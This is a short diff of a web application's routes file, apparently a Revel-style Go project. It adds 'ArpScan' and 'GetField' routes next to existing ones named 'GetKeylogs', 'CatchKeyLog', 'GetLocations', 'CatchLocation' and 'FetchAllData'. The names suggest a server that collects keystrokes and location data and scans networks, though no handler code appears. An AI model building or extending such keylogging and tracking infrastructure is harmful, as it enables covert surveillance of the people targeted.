@@ -12,6 +12,9 @@ GET     /favicon.ico                            404
 GET     /GetKeylogs             	App.GetKeylogs
 GET     /CatchKeyLog             	App.CatchKeyLog
 GET     /Pinger		             	App.Pinger
+GET     /ArpScan	             	App.ArpScan
+
+GET     /GetField	             	App.GetField
 GET     /GetLocations             	App.GetLocations
 GET     /CatchLocation             	App.CatchLocation
 GET     /FetchAllData             	App.FetchAllData
